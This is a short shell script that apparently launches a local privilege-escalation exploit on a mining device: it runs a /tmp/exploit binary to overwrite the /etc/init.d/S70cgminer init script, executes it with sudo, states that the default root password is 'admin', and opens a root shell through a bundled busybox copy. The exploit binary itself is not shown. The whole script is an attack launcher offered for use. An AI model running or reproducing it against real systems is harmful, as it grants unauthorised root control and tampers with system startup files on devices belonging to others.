#!/bin/sh

chmod +x /tmp/exploit
/tmp/exploit /etc/init.d/S70cgminer /tmp/S70cgminer
sudo /etc/init.d/S70cgminer

echo "Use "reboot -n" to reboot safely without a crash."
echo "Default password for root is 'admin'."
echo "Get root with '/tmp/miner/busybox2 su -'"

/tmp/miner/busybox2 su -

